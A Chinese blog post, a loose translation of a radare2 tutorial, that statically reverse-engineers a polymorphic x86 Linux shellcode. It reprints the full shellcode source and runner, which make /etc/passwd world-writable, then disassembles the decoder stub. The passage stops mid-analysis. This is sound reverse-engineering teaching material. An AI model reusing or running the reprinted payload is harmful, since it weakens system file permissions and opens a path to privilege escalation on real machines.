<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="reverse-engineer," />








  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="意译自： Adventures with Radare2 #1: A Simple Shellcode Analysis
有个同学最近在学汇编。把我逆向的热情又拉起来了。下午看到个比较有意思又能看懂的文章，胡乱意译，可以当作我个人的一个笔记。有什么想法可以留言讨论。
以下是正文

Radare2——一个开源逆向工程工具箱，包含反汇编器、调试器和十六进制编辑器。本文将它嗯过逆向在Project Sh">
<meta property="og:type" content="article">
<meta property="og:title" content="Radare2小试: 简单shellcode分析(意译)">
<meta property="og:url" content="http://reverland.org/exploit/2014/08/07/radare2-shellcode/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="意译自： Adventures with Radare2 #1: A Simple Shellcode Analysis
有个同学最近在学汇编。把我逆向的热情又拉起来了。下午看到个比较有意思又能看懂的文章，胡乱意译，可以当作我个人的一个笔记。有什么想法可以留言讨论。
以下是正文

Radare2——一个开源逆向工程工具箱，包含反汇编器、调试器和十六进制编辑器。本文将它嗯过逆向在Project Sh">
<meta property="og:updated_time" content="2015-11-15T06:01:31.531Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Radare2小试: 简单shellcode分析(意译)">
<meta name="twitter:description" content="意译自： Adventures with Radare2 #1: A Simple Shellcode Analysis
有个同学最近在学汇编。把我逆向的热情又拉起来了。下午看到个比较有意思又能看懂的文章，胡乱意译，可以当作我个人的一个笔记。有什么想法可以留言讨论。
以下是正文

Radare2——一个开源逆向工程工具箱，包含反汇编器、调试器和十六进制编辑器。本文将它嗯过逆向在Project Sh">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Radare2小试: 简单shellcode分析(意译) | Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          

  <div id="posts" class="posts-expand">
    

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                Radare2小试: 简单shellcode分析(意译)
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-07T00:00:00+08:00" content="2014-08-07">
              2014-08-07
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2014/08/07/radare2-shellcode/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2014/08/07/radare2-shellcode/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        <span itemprop="articleBody"><p>意译自： <a href="http://canthack.org/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/" target="_blank" rel="external">Adventures with Radare2 #1: A Simple Shellcode Analysis</a></p>
<p>有个同学最近在学汇编。把我逆向的热情又拉起来了。下午看到个比较有意思又能看懂的文章，胡乱意译，可以当作我个人的一个笔记。有什么想法可以留言讨论。</p>
<p>以下是正文</p>
<hr>
<p><a href="http://radare.org/" target="_blank" rel="external">Radare2</a>——一个开源逆向工程工具箱，包含反汇编器、调试器和十六进制编辑器。本文将它嗯过逆向在<a href="http://www.projectshellcode.com" target="_blank" rel="external">Project Shellcode</a>上找到的shellcode来展示其基础用法。</p>
<h2 id="Shellcode">Shellcode</h2><p>我们先谈谈啥叫<code>Shellcode</code>，别想成shell脚本了。<code>shellcode</code>之用来挖掘漏洞的有效载荷。其中的典型就是注入一段启动shell的代码。</p>
<p>Project Shellcode是一个shellcode及其源码仓库。我通过<a href="http://reddit.com/r/reverseengineering" target="_blank" rel="external">reddit.com/r/reverseengineering</a>在上月找到的。让我们看看其中一个例子。</p>
<h2 id="60字节的chmod_777多态x86_Linux_Shellcode">60字节的chmod 777多态x86 Linux Shellcode</h2><p>我碰巧先看到<a href="http://www.projectshellcode.com/?q=node/289" target="_blank" rel="external">这个</a>.</p>
<pre><code>/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' <span class="command">\ </span>           __  /'__`<span class="command">\ </span>       /<span class="command">\ </span><span class="command">\_</span>_  /'__`<span class="command">\ </span>                  0
0  /<span class="command">\_</span>, <span class="command">\ </span>   ___   /<span class="command">\_</span><span class="command">\/</span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span>   ___<span class="command">\ </span><span class="command">\ </span>,_<span class="command">\/</span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span> _ ___           1
1  <span class="command">\/</span>_/<span class="command">\ </span><span class="command">\ </span>/' _ `<span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\/</span>_/_<span class="command">\_</span>&lt;_  /'___<span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\`</span>'__<span class="command">\ </span>         0
0     <span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\_</span>_/<span class="command">\ </span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span>           1
1      <span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\_</span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\_</span>___/<span class="command">\ </span><span class="command">\_</span>___<span class="command">\\</span> <span class="command">\_</span>_<span class="command">\\</span> <span class="command">\_</span>___/<span class="command">\ </span><span class="command">\_</span><span class="command">\ </span>          0
0       <span class="command">\/</span>_/<span class="command">\/</span>_/<span class="command">\/</span>_/<span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\/</span>___/  <span class="command">\/</span>____/ <span class="command">\/</span>__/ <span class="command">\/</span>___/  <span class="command">\/</span>_/           1
1                  <span class="command">\ </span><span class="command">\_</span>___/ &gt;&gt; Exploit database separated by exploit   0
0                   <span class="command">\/</span>___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  <span class="special">[</span>+<span class="special">]</span> Site            : Inj3ct0r.com                                  0
1  <span class="special">[</span>+<span class="special">]</span> Support e-mail  : submit<span class="special">[</span>at<span class="special">]</span>inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 60 bytes chmod 777 polymorphic x86 linux shellcode
Date   : Sat Jun  5 16:10:00 2010
Author : gunslinger_ 
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com),
ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
mywisdom (devilzc0de.org), loneferret (offensive-security.com)
*/

/*
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost<span class="special">#</span> gcc -o polymorphic_chmod polymorphic_chmod.c
chmod.c: In function ‘main’:
chmod.c:37: warning: incompatible implicit declaration of built-in function ‘strlen’
root@localhost<span class="special">#</span> ./polymorphic_chmod
Length: 64
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rwxrwxrwx 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost<span class="special">#</span> chmod 644 /etc/passwd
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
*/

<span class="special">#</span>include &lt;stdio.h&gt;
<span class="special">#</span>include &lt;string.h&gt;

char shellcode<span class="special">[</span><span class="special">]</span> =
    "<span class="command">\xeb</span><span class="command">\x</span>11<span class="command">\x</span>5e<span class="command">\x</span>31<span class="command">\xc</span>9<span class="command">\xb</span>1<span class="command">\x</span>27<span class="command">\x</span>80<span class="command">\x</span>6c<span class="command">\x</span>0e<span class="command">\xff</span><span class="command">\x</span>35<span class="command">\x</span>80<span class="command">\xe</span>9<span class="command">\x</span>01"
    "<span class="command">\x</span>75<span class="command">\xf</span>6<span class="command">\xeb</span><span class="command">\x</span>05<span class="command">\xe</span>8<span class="command">\xea</span><span class="command">\xff</span><span class="command">\xff</span><span class="command">\xff</span><span class="command">\x</span>20<span class="command">\x</span>4a<span class="command">\x</span>66<span class="command">\xf</span>5<span class="command">\xe</span>5<span class="command">\x</span>44"
    "<span class="command">\x</span>90<span class="command">\x</span>66<span class="command">\xfe</span><span class="command">\x</span>9b<span class="command">\xee</span><span class="command">\x</span>34<span class="command">\x</span>36<span class="command">\x</span>02<span class="command">\xb</span>5<span class="command">\x</span>66<span class="command">\xf</span>5<span class="command">\xe</span>5<span class="command">\x</span>36<span class="command">\x</span>66<span class="command">\x</span>10"
    "<span class="command">\x</span>02<span class="command">\xb</span>5<span class="command">\x</span>1d<span class="command">\x</span>1b<span class="command">\x</span>34<span class="command">\x</span>34<span class="command">\x</span>34<span class="command">\x</span>64<span class="command">\x</span>9a<span class="command">\xa</span>9<span class="command">\x</span>98<span class="command">\x</span>64<span class="command">\xa</span>5<span class="command">\x</span>96<span class="command">\xa</span>8"
    "<span class="command">\xa</span>8<span class="command">\xac</span><span class="command">\x</span>99";

int main(void)
<span class="special">{</span>
    fprintf(stdout,"Length: <span class="comment">%zu\n",strlen(shellcode));</span>
    (*(void(*)()) shellcode)();

return 0;
<span class="special">}</span>
</code></pre><p>评论中的描述声称代码在<code>/etc/passwd</code>中设置文件权限为<code>777</code>，但是你乍一看肯定看不出来。我们只能看到一个初始化为16进制的字节数组。接着被投射给函数指针然后调用。</p>
<h2 id="实用Radare2分析">实用Radare2分析</h2><p>我们如何弄清程序做了什么？我们可以构建并且运行它，但我不会。因为它可能移除我的家目录。我们实用radare2静态检测它。</p>
<p>首先构建二进制文件</p>
<pre><code>~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse ⮀ cc -o shellcode polymorphic_chmod_etc_passwd_777.c</span>
</code></pre><p>接着载入到radare2中：</p>
<pre><code> ~/Work/project/<span class="property">reverse</span> ⮀ r2 ./shellcode 
 <span class="comment">-- In soviet Afghanistan you debug radare2!</span>
[<span class="number">0x00400520</span>]&gt; 
</code></pre><p>我们没有加<code>-d</code>参数，这样可以以静态分析模式运行，而不是实用radare2内建的调试器。现在radare已经就绪，让我们开始输入命令。</p>
<p>radare2的命令通常都非常短。键入<code>?</code>回车就会进入帮助概述。若问号后面跟着命令，就会给出命令使用的详细信息。</p>
<p>我们首先得定位字节字符串。因为二进制文件没有被精简(stripped)，有幸保留了<code>main</code>函数的虚拟地址。Radare2使用<code>flags</code>的概念标记二进制文件中的有用位置。尝试键入<code>f</code>来得到标记列表。main函数将被标记为<code>sym.main</code>。</p>
<p>我们使用<code>pd</code>命令反汇编：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pd@sym.main 
            <span class="comment">;-- sym.main:</span>
            <span class="number">0x0804849c</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>                                     
            <span class="number">0x0804849d</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
            <span class="number">0x0804849f</span>    83e4f0       <span class="keyword">and</span> <span class="literal">esp</span>, <span class="number">0xfffffff0</span>
            <span class="number">0x080484a2</span>    83ec10       <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x10</span>
            <span class="number">0x080484a5</span>    c7042440a00. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], sym.shellcode <span class="comment">;  0x0804a040 </span>
            <span class="number">0x080484ac</span>    e8bffeffff   <span class="keyword">call</span> sym.imp.strlen
               <span class="number">0x08048370</span>(unk) <span class="comment">; sym.imp.strlen</span>
            <span class="number">0x080484b1</span>    8b1580a00408 <span class="keyword">mov</span> <span class="literal">edx</span>, [sym.__TMC_END__]
            <span class="number">0x080484b7</span>    <span class="number">89442408</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x8</span>], <span class="literal">eax</span>
</code></pre><p><code>pd</code>命令将反汇编等于<code>block size</code>的代码块(参见<code>b</code>命令)，本例中块大小似乎比main函数大很多。我们知道gcc生成结构非常好的函数，我们让radare2来分析这个函数并完整打印：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; af@sym.main 
[<span class="number">0x080483a0</span>]&gt; pdf@sym.main
           <span class="comment">; DATA XREF from 0x080483b7 (fcn.08048396)</span>
/ (fcn) sym.main <span class="number">61</span>
|          <span class="number">0x0804849c</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>
|          <span class="number">0x0804849d</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
|          <span class="number">0x0804849f</span>    83e4f0       <span class="keyword">and</span> <span class="literal">esp</span>, <span class="number">0xfffffff0</span>
|          <span class="number">0x080484a2</span>    83ec10       <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x10</span>
|          <span class="number">0x080484a5</span>    c7042440a00. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], sym.shellcode <span class="comment">;  0x0804a040 </span>
|          <span class="number">0x080484ac</span>    e8bffeffff   <span class="keyword">call</span> sym.imp.strlen
|             sym.imp.strlen(unk)
|          <span class="number">0x080484b1</span>    8b1580a00408 <span class="keyword">mov</span> <span class="literal">edx</span>, [sym.__TMC_END__]
|          <span class="number">0x080484b7</span>    <span class="number">89442408</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x8</span>], <span class="literal">eax</span>
|          <span class="number">0x080484bb</span>    c7442404708. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>+<span class="number">0x4</span>], <span class="keyword">str</span>.Length___zu_n <span class="comment">;  0x08048570 </span>
|          <span class="number">0x080484c3</span>    <span class="number">891424</span>       <span class="keyword">mov</span> [<span class="literal">esp</span>], <span class="literal">edx</span>
|          <span class="number">0x080484c6</span>    e8c5feffff   <span class="keyword">call</span> sym.imp.fprintf
|             sym.imp.fprintf()
|          <span class="number">0x080484cb</span>    b840a00408   <span class="keyword">mov</span> <span class="literal">eax</span>, sym.shellcode <span class="comment">;  0x0804a040 </span>
|          <span class="number">0x080484d0</span>    ffd0         <span class="keyword">call</span> <span class="literal">eax</span>
|             <span class="number">0x00000000</span>() <span class="comment">; section..comment</span>
|          <span class="number">0x080484d2</span>    b800000000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x0</span>
|          <span class="number">0x080484d7</span>    c9           <span class="keyword">leave</span>
\          <span class="number">0x080484d8</span>    c3           <span class="keyword">ret</span>
</code></pre><p>打眼一看就知道需要什么知道什么了。在二进制文件中有足够的信息来帮助标记挖掘漏洞的shellcode字符串位置。你可以在符号名后头看到实际地址。</p>
<p>这个程序对载荷做了什么？可以看到<code>strlen()</code>和<code>fprintf()</code><br>的调用。但更重要的，shellcode的地址在被调用前载入eax寄存器(在<code>0x080484cb</code>载入，于<code>0x080484d0</code>调用)。显然下一步就是检查有效载荷看看它做了什么：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pD <span class="number">60</span>@sym.shellcode
|      ,  <span class="comment">; DATA XREF from 0x080484a2 (sym.main)</span>
|      ,  <span class="comment">; DATA XREF from 0x080484c8 (sym.main)</span>
       ,  <span class="comment">;-- sym.shellcode:</span>
       ,=&lt; <span class="number">0x0804a040</span>    eb11         <span class="keyword">jmp</span> <span class="number">0x804a053</span>
       |   <span class="comment">;-- str._1___:</span>
       |   <span class="number">0x0804a042</span>     <span class="string">.string</span> <span class="string">"^1ɱ'"</span> <span class="comment">; len=6</span>
      ||   <span class="number">0x0804a048</span>    6c           <span class="keyword">insb</span>
      ||   <span class="number">0x0804a049</span>    0e           <span class="keyword">push</span> <span class="literal">cs</span>
      ||   <span class="number">0x0804a04a</span>    ff3580e90175 <span class="keyword">push</span> <span class="preprocessor">dword</span> [<span class="number">0x7501e980</span>]
       |   <span class="number">0x0804a050</span>    f6eb         <span class="keyword">imul</span> <span class="literal">bl</span>
     | |   <span class="number">0x0804a052</span>    05e8eaffff   <span class="keyword">add</span> <span class="literal">eax</span>, <span class="number">0xffffeae8</span>
     |     <span class="number">0x0804a057</span>    ff20         <span class="keyword">jmp</span> <span class="preprocessor">dword</span> [<span class="literal">eax</span>]
           <span class="number">0x0804a059</span>    4a           <span class="keyword">dec</span> <span class="literal">edx</span>
           <span class="number">0x0804a05a</span>    66f5         o16 <span class="keyword">cmc</span>
           <span class="number">0x0804a05c</span>    e544         <span class="keyword">in</span> <span class="literal">eax</span>, <span class="number">0x44</span>
           <span class="number">0x0804a05e</span>    <span class="number">90</span>           <span class="keyword">nop</span>
           <span class="number">0x0804a05f</span>    66fe9b       invalid
           <span class="number">0x0804a062</span>    ee           <span class="keyword">out</span> <span class="literal">dx</span>, <span class="literal">al</span>
           <span class="number">0x0804a063</span>    <span class="number">3436</span>         <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x36</span>
           <span class="number">0x0804a065</span>    02b566f5e536 <span class="keyword">add</span> <span class="number">dh</span>, [<span class="literal">ebp</span>+<span class="number">0x36e5f566</span>]
           <span class="number">0x0804a06b</span>    <span class="number">661002</span>       o16 <span class="keyword">adc</span> [<span class="literal">edx</span>], <span class="literal">al</span>
           <span class="number">0x0804a06e</span>    b51d         <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0x1d</span> <span class="comment">;  0x0000001d </span>
           <span class="comment">;-- str._e444d:</span>
           <span class="number">0x0804a070</span>     <span class="string">.string</span> <span class="string">"\\e444d"</span> <span class="comment">; len=6</span>
           <span class="number">0x0804a076</span>    a99864a596   <span class="keyword">test</span> <span class="literal">eax</span>, <span class="number">0x96a56498</span>
           <span class="number">0x0804a07b</span>    a8           invalid
</code></pre><p>这里使用<code>pD</code>来指定想要反汇编的字节数(这里是60)。该怎么评论这些呢？乍一看，有些不能执行的东西，有点棘手。</p>
<p>译者：我的radare git-2014-7-26版本显然和2011年作者写这篇文章时变化了很多。为了能够继续下去，使用<code>pDi</code>命令：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pDi <span class="number">60</span>@sym.shellcode
<span class="number">0x0804a040</span>              eb11  <span class="keyword">jmp</span> <span class="number">0x804a053</span>
<span class="number">0x0804a042</span>                5e  <span class="keyword">pop</span> <span class="literal">esi</span>
<span class="number">0x0804a043</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a045</span>              b127  <span class="keyword">mov</span> <span class="literal">cl</span>, <span class="number">0x27</span>
<span class="number">0x0804a047</span>        806c0eff35  <span class="keyword">sub</span> <span class="preprocessor">byte</span> [<span class="literal">esi</span>+<span class="literal">ecx</span>-<span class="number">0x1</span>], <span class="number">0x35</span>
<span class="number">0x0804a04c</span>            80e901  <span class="keyword">sub</span> <span class="literal">cl</span>, <span class="number">0x1</span>
<span class="number">0x0804a04f</span>              75f6  <span class="keyword">jne</span> <span class="number">0x804a047</span>
<span class="number">0x0804a051</span>              eb05  <span class="keyword">jmp</span> <span class="number">0x804a058</span>
<span class="number">0x0804a053</span>        e8eaffffff  <span class="keyword">call</span> <span class="number">0x804a042</span>
<span class="number">0x0804a058</span>            204a66  <span class="keyword">and</span> [<span class="literal">edx</span>+<span class="number">0x66</span>], <span class="literal">cl</span>
<span class="number">0x0804a05b</span>                f5  <span class="keyword">cmc</span>
<span class="number">0x0804a05c</span>              e544  <span class="keyword">in</span> <span class="literal">eax</span>, <span class="number">0x44</span>
<span class="number">0x0804a05e</span>                <span class="number">90</span>  <span class="keyword">nop</span>
<span class="number">0x0804a05f</span>                <span class="number">66</span>  invalid
<span class="number">0x0804a062</span>                ee  <span class="keyword">out</span> <span class="literal">dx</span>, <span class="literal">al</span>
<span class="number">0x0804a063</span>              <span class="number">3436</span>  <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x36</span>
<span class="number">0x0804a065</span>      02b566f5e536  <span class="keyword">add</span> <span class="number">dh</span>, [<span class="literal">ebp</span>+<span class="number">0x36e5f566</span>]
<span class="number">0x0804a06b</span>            <span class="number">661002</span>  o16 <span class="keyword">adc</span> [<span class="literal">edx</span>], <span class="literal">al</span>
<span class="number">0x0804a06e</span>              b51d  <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0x1d</span>
<span class="number">0x0804a070</span>            1b3434  <span class="keyword">sbb</span> <span class="literal">esi</span>, [<span class="literal">esp</span>+<span class="literal">esi</span>]
<span class="number">0x0804a073</span>              <span class="number">3464</span>  <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x64</span>
<span class="number">0x0804a075</span>    9aa99864a596a8  <span class="keyword">call</span> <span class="preprocessor">dword</span> <span class="number">0xa896</span>:<span class="number">0xa56498a9</span>
<span class="number">0x0804a07c</span>              a8ac  <span class="keyword">test</span> <span class="literal">al</span>, <span class="number">0xac</span>
<span class="number">0x0804a07e</span>                <span class="number">99</span>  <span class="keyword">cdq</span>
<span class="number">0x0804a07f</span>            <span class="number">004743</span>  <span class="keyword">add</span> [<span class="literal">edi</span>+<span class="number">0x43</span>], <span class="literal">al</span>
<span class="number">0x0804a082</span>                <span class="number">43</span>  <span class="keyword">inc</span> <span class="literal">ebx</span>
<span class="number">0x0804a083</span>              3a20  <span class="keyword">cmp</span> <span class="number">ah</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a085</span>            <span class="number">284765</span>  <span class="keyword">sub</span> [<span class="literal">edi</span>+<span class="number">0x65</span>], <span class="literal">al</span>
<span class="number">0x0804a088</span>                6e  <span class="keyword">outsb</span>
<span class="number">0x0804a089</span>              746f  <span class="keyword">je</span> <span class="number">0x804a0fa</span>
<span class="number">0x0804a08b</span>                6f  <span class="keyword">outsd</span>
<span class="number">0x0804a08c</span>            20342e  <span class="keyword">and</span> [<span class="literal">esi</span>+<span class="literal">ebp</span>], <span class="number">dh</span>
<span class="number">0x0804a08f</span>                <span class="number">37</span>  <span class="keyword">aaa</span>
<span class="number">0x0804a090</span>    2e332d72312070  <span class="keyword">xor</span> <span class="literal">ebp</span>, [<span class="literal">cs</span>:<span class="number">0x70203172</span>]
<span class="number">0x0804a097</span>              312e  <span class="keyword">xor</span> [<span class="literal">esi</span>], <span class="literal">ebp</span>
<span class="number">0x0804a099</span>            332c20  <span class="keyword">xor</span> <span class="literal">ebp</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a09c</span>              <span class="number">7069</span>  <span class="keyword">jo</span> <span class="number">0x804a107</span>
<span class="number">0x0804a09e</span>      652d302e352e  <span class="keyword">sub</span> <span class="literal">eax</span>, <span class="number">0x2e352e30</span>
<span class="number">0x0804a0a4</span>        352920342e  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="number">0x2e342029</span>
<span class="number">0x0804a0a9</span>                <span class="number">37</span>  <span class="keyword">aaa</span>
<span class="number">0x0804a0aa</span>            2e3300  <span class="keyword">xor</span> <span class="literal">eax</span>, [<span class="literal">cs</span>:<span class="literal">eax</span>]
<span class="number">0x0804a0ad</span>              1c00  <span class="keyword">sbb</span> <span class="literal">al</span>, <span class="number">0x0</span>
<span class="number">0x0804a0af</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b1</span>              <span class="number">0200</span>  <span class="keyword">add</span> <span class="literal">al</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0b3</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b5</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b7</span>              <span class="number">0400</span>  <span class="keyword">add</span> <span class="literal">al</span>, <span class="number">0x0</span>
<span class="number">0x0804a0b9</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0bb</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0bd</span>                9c  <span class="keyword">pushfd</span>
<span class="number">0x0804a0be</span>            <span class="number">840408</span>  <span class="keyword">test</span> [<span class="literal">eax</span>+<span class="literal">ecx</span>], <span class="literal">al</span>
<span class="number">0x0804a0c1</span>              3a00  <span class="keyword">cmp</span> <span class="literal">al</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0c3</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c5</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c7</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c9</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0cb</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0cd</span>                1e  <span class="keyword">push</span> <span class="literal">ds</span>
<span class="number">0x0804a0ce</span>              <span class="number">0300</span>  <span class="keyword">add</span> <span class="literal">eax</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0d0</span>              <span class="number">0002</span>  <span class="keyword">add</span> [<span class="literal">edx</span>], <span class="literal">al</span>
</code></pre><p>现在开始在心中模拟执行。首先跳到<code>0x804a053</code>，在那里调用<code>0x804a042</code>，就是第一个指令后面的一个指令。</p>
<p>看上去啥也没干似的。但是，<code>call</code>调用将调用的返回地址推入栈中，接着存入<code>esi</code>中。在32位x86中没法直接获取<code>eip</code>，刚才那个过程就是著名的获取eip的一种hack。程序计数器(<code>eip</code>)可以用来指向有效载荷相关的数据/代码(记住：攻击者不知道他的代码将被连接器分配到何处)。</p>
<p>现在执行到<code>0x0804a043</code>，<code>esi</code>中的值是<code>0x0804a058</code>。这个异或指令在把<code>0x27</code>载入<code>ecx</code>前将其置零。</p>
